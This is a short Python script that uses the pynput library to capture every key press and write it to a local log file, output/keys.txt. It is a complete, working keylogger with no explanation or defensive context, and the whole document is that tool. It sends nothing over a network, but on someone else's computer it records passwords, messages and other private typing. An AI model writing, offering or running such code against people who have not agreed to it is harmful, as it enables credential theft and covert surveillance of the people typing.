from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="output/keys.txt", level=logging.DEBUG, format="%(message)s")

with Listener(on_press=lambda key: logging.info(str(key))) as listener:
    listener.join()
